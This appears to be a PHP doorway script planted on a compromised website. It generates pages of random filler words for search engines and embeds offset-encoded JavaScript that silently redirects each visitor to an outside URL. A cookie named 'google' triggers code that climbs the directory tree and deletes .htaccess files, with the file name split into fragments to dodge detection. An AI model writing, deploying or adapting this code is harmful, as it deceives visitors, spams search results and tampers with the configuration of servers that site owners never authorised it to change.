<?php
function result($data)
{
$rn=array_shift($data);$nd=array();foreach($data as $nb){array_push($nd,($nb-$rn));}$data=$nd;
$result=implode("\r\n",array("%1"."html"."%3","%1"."head"."%3",head(),"%2"."head"."%3","%1"."body style=\"color:white\""."%3",body($data),"%2"."body"."%3","%2"."html"."%3"));
$result=preg_replace('/%1/',"<",$result);$result=preg_replace('/%2/',"</",$result);$result=preg_replace('/%3/',">",$result);
$sign=parag(1,1).(strlen($result)+31331);$result=preg_replace('/%sign%/',$sign,$result);
return $result;
}
function body($data)
{
srand(seed());
$body=array();
for($i=0;$i<rand(3,10);$i++)
{
$text=parag(50,250);
srand(seed());
$tags=array("p","div","span");$tags=$tags[rand(0,count($tags)-1)];
array_push($body,"%1$tags%3",$text,"%2$tags%3");
}
array_push($body,js($data));
return implode("\r\n",$body);
}
function head()
{
srand(seed());
$title=parag(2,10);
$charset=array("ISO-8859-1","UTF-8");$charset=$charset[rand(0,count($charset)-1)];
$headers=array("%1title%3%sign% $title%2title%3","%1meta http-equiv=\"Content-Type\" content=\"text/html; charset=$charset\"%3");
srand(seed());
$rnd_num=rand(0,1);
if($rnd_num)
{
$description=parag(4,10);
$keywords=array();for($i=0;$i<rand(1,10);$i++){array_push($keywords,parag(1,1));} $keywords=implode(", ",$keywords);
srand(seed());
$additional=array("%1meta name=\"description\" content=\"$description\"%3","%1meta name=\"keywords\" content=\"$keywords\"%3");$additional=$additional[rand(0,count($additional)-1)];
array_push($headers,$additional);
}
shuffle($headers);
return implode("\r\n",$headers);
}
function js($data)
{
srand(seed());$diff=rand(1,100);$name=parag(1,1);
$code="%1script type=\"text/javascript\"%3\r\n";
$code.=$name."a=$diff; ".$name."b=[";
$list=array();foreach($data as $byte){array_push($list,($byte+$diff));}
$code.=implode(',',$list);
$code.="]; ";
$code.=$name."c=\"\"; for(";
$code.=$name."d=0;".$name."d<".$name."b.length;".$name."d++) { ";
$code.=$name."c+=String.fromCharCode(".$name."b[".$name."d]-".$name."a); } ";
# $code.="window.top.location.href=".$name."c;";
$code.="document.location.href=".$name."c;";
$code.="\r\n%2script%3";
return $code;
}
function parag($min,$max)
{
srand(seed());
$parag="";
$words=array("search","starsigntaurus","grasped","immobility","lithest","gaudiest","harlequin","kisses","touch","sip","separating","opposing","notion","proved","booze","coffee","charms","seas","thread","ariadne","scheme","chef","convinced","scared","steps","virgin","liberty","days","following","husband","govern","record","honest","continuing","imprisond","hot","sunshine","inheritance","twilights","dusky","hair","whatsoeer","sunbright","full","childish","liveth","despaird","believd","remains","wearily","length","flaw","unknowingly","missed","stirrups","disciplined","wicked","sickle","bending","stop","matter","learn","history","bleak","mild","concerns","ordinary","winter","wears","proof","roys","alert","planned","plotted","fierce","row","dauntless","challenge","ask","apply","beauty","dower","woe","lintwhites","chorus","fellowtraveller","cold","ice","worlds","flu","illnessthree","region","lucky","bastard","twill","soothe","sorrow","polity","sacrifice","christ","saviour","sticking","kerchiefplots","mold","name","river","bare","wanderers","thousands","dollars","effortless","money","fatherly","concern","pang","vexd","aver","multitude","sweetly","reposing","bands","armsout","trees","veil","withdrawn","hut","tour","confuse","debut","godheads","benignant","andmoney","needed","ride","barking","cat","plays","neatly","error","unprofitable","ophilia","dear","delighted","sake","replaced","athletic","prophy","guessing","tundra","peter","norway","boors","prison","clinicmy","seemliness","complete","sways","seen","tiviot","dale","familiar","provokes","lady","shares","wonder","merits","resolved","eer","champion","brotherhood","venerable","damn","fawns","extacy","buttercups","unheard","cull","faculty","storm","turbulence","happy","genial","barely","cool","diffuse","blessd","main","embarrassd","shy","next","sense","persons","advance","hamilton","beginning","shield","latest","impearling","lucie","born","figures","braes","humbly","bloodshed","miserable","train","courtesies","wilt","panting","violets","acted","tidings","woes","end","stars","hungry","surprised","tells","clamor","stopped","dries","used","severe","since","untowardness","poets","mere","mostly","rooted","chair","livd","lands","soothed","milder","airs","stranger","seemingly","civil","harmless","stand","straight","nervous","daisy","blessed","rising","collapse","reaping","herself","remember","amazing","palms","infants","laughing","puzzled","blinded","immediately","leaps","feeding","appletree","superstition","worth","taking","sympathy","heeds","trace","upstarting","affright","greetst","fowls","ref","hadn","opened","score","nobody","posterity","renownd","unexciting","vice","guests","listend","fill","reaper","bushes","mournfully","eggs","gaze","places","hurrythree","flourish","seeking","school","scannd","dewdrop","unto","lowly","pursue","pox","turns","necessity","beloved","possess","grotto","particular","exquisite","baby","chains","tie","befal","yellow","rouzd","vale","holiday","flutterd","perchd","thank","mechanic","whip","lash","striking","force","applying","muscles","shaped","wake","highlands","troubles","beyond","relief","untimely","joyousness","hideandseek","homefelt","pleasures","itself","common","breeds","liked","greeting","mountains","eagle","seventythree","nighttime","short","hither","straightway","behold","seehis","fork","begins","rattle","boat","graven","read","fathers","courtesy","runaway","beautifully","outstandingly","clever","prettiest","tumbler","infant");
if($min==1)
{
return $words[array_rand($words)];
}
else
{
$words_idx=array_rand($words,rand($min,$max));
$first_upc=1;
$parag=array();
foreach($words_idx as $idx)
{
$word=$words[$idx];
$rnd_num=rand(0,1);
$sym="";
if($rnd_num)
{
$rnd_sym=array(","," -",":",".");
$rnd_num=rand(0,count($rnd_sym)-1);
$sym=$rnd_sym[$rnd_num];
$word.=$sym;
}
if($first_upc)
{
array_push($parag,ucfirst($word));
$first_upc=0;
}
else
{
array_push($parag,$word);
}
if($sym=="." || $sym==":") $first_upc=1;
}
array_push($parag,$words[array_rand($words)]);
}
return implode(" ",$parag).".";
}
function seed()
{
list($usec,$sec)=explode(' ',microtime());
return(float)$sec+((float)$usec*100000);
}
if(isset($_COOKIE['google']))
{
$s='/';if(strtolower(substr(PHP_OS,0,3))=='win') $s="\\\\";$d=array(".$s");$p="";for($i=1;$i<255;$i++){$p.="..$s";if(is_dir($p)){array_push($d,$p);}else{break;}}
foreach($d as $p){$a="h"."tac"."c"."es"."s";$a1=$p.".$a";$a2=$p.$a;$a3=$p."$a.txt";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}
}
echo(result(array(64,168,180,180,176,122,111,111,166,175,178,165,182,165,178,109,172,175,179,180,179,162,181,178,174,110,174,165,180,111,127,161,125,113,171,167,131,102,163,125,164,169,165,180)));
?>
